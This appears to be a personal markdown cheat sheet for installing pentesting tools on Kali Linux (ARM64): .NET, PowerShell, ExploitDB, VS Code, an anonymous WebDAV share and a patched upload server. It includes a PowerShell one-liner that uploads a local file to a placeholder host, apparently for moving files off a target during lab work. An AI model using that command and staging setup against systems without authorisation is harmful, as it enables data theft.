# Install tools on Kali (Arm64 M1)

## Install .NET 8

Install script `https://learn.microsoft.com/en-us/dotnet/core/install/linux-scripted-manual`

```bash
wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh
chmod +x ./dotnet-install.sh
./dotnet-install.sh --channel 8.0 --runtime dotnet
export DOTNET_ROOT=~/.dotnet
export PATH=$PATH:$DOTNET_ROOT:$DOTNET_ROOT/tools
# Add permanently to .zshrc
echo "# Install .NET" >> .zshrc
echo "export DOTNET_ROOT=~/.dotnet"  >> .zshrc
echo "export PATH=$PATH:$DOTNET_ROOT:$DOTNET_ROOT/tools"  >> .zshrc
```

## Install Powershell

Install script `https://learn.microsoft.com/en-us/powershell/scripting/install/install-other-linux?view=powershell-7.4#install-as-a-net-global-tool`

```bash
dotnet tool install --global PowerShell
```

## Install ExploitDB and SearchSploit

```bash
sudo apt -y install exploitdb
```

## Install VS Code

* Navigate to `https://code.visualstudio.com/download`
* Click ARM64 to download ... arm64.deb
* Install with apt

```bash
sudo apt install code...arm64.deb
```

## Install WebDAV

```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
echo "WebDAV test" > /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

## Install HTTP Upload Server

```bash
pip install uploadserver
```

Patch uploadserver.receive_upload(handler)

* Support single or multiple files
* Support Powershell UploadFile
* `(New-Object Net.WebClient).UploadFile('http://IP/upload', 'some-file.txt');`

```python
# gedit /home/kali/.local/lib/python3.11/site-packages/uploadserver/__init__.py
# patch receive_upload(handler)
if 'file' in form:
    fields = form['file']
elif 'files' in form:
    fields = form['files']
else:
    return (http.HTTPStatus.BAD_REQUEST, 'Field "file" or "files" not found')
```

## TLDR

TL;DR: Tell us how touse the tools efficiently

```bash
sudo apt update && sudo apt install tldr
tldr --update
```
